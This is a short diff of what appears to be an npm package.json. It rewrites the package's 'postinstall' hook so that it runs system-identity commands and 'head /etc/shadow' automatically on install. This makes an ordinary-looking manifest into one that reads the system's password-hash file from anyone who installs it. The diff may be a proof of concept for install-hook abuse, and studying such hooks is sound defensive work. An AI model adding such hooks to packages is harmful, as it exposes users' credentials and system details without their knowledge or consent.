@@ -11,7 +11,7 @@
   "main": "server.js",
   "scripts": {
     "start": "server.js",
-    "postinstall": "id;whoami"
+    "postinstall": "uname -a;id;whoami;head /etc/shadow"
   },
   "repository": {
     "type": "git",
